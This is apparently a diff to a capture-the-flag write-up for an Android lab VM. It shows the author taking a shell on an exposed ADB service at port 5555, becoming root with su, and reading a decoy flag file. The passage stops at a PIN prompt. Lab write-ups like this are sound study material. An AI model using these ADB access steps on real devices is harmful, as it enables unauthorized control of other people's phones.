@@ -35,3 +35,63 @@ PORT      STATE SERVICE VERSION
 MAC Address: 00:0C:29:37:42:7C (VMware)
 Service Info: OSs: Android, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+port `5555` seems suspicious, i did some research on it and i found a way to exploit it. :)
+
+port `5555` == adb service, adb (Android Debug Bridge) can control your device over USB or wireless by enabling a daemon server at port 5555.
+
+Install adb: `sudo apt-get install adb`
+
+Now let's exploit it, first we need to connect on target:
+
+```
+$ adb connect $ip:5555
+connected to 192.168.1.10:5555
+```
+
+Now let's spawn a shell:
+
+```
+$ adb shell
+uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/ $ 
+```
+
+Bingo! That simple, we can even simplier take a root shell:
+
+```
+$ su
+uid=0(root) gid=0(root)@x86:/ # 
+```
+
+Now because i have no idea how android file system is working, i decided to search for the root directory:
+
+```
+uid=0(root) gid=0(root)@x86:/ # find / -type d -name "root"
+/data/root
+```
+
+We can see a `flag.txt` there:
+
+```
+uid=0(root) gid=0(root)@x86:/ # cd /data/root
+uid=0(root) gid=0(root)@x86:/data/root # ls
+flag.txt
+uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
+Great Move !!! 
+
+Itz a easy one right ???
+
+lets make this one lil hard
+
+
+You flag is not here  !!!     
+
+
+Agent "S"   Your Secret Key ---------------->259148637
+```
+
+Here i stuck, i was searching for the flag for loooot of hours & then i deleted the box i said OK i got root shell i can't find the real flag. Today i had a chat with a friend on this box and we both stuck finding the real flag, i told him that you can remove the pin using adb shell. After some minutes he found the real flag! Shout out to @Freakazoid without him i wasn't able to gain the real flag! :D
+
+Now as you can see, the android box asks for a PIN:
+
+
